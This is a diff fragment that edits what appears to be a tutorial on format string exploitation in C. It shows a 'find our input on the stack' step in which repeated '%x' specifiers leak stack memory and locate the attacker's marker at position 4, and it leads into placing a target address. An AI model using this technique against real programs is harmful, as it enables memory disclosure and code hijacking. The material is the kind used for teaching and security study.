@@ -130,10 +130,10 @@ printf("Hello%n", &count);
 
 **Step 1: Find Our Input on Stack**
 ```bash
-Input: "AAAA%x%x%x%x"
-Output: AAAA200b7fd1ac0b7ff37d041414141
-                                ^^^^^^^^
-                            Our "AAAA" at position 4!
+Input: "AAAA" + "%x."*10
+Output: AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78...
+                                  ^^^^^^^^
+                              Our "AAAA" at position 4!
 ```
 
 **Step 2: Place Target Address**
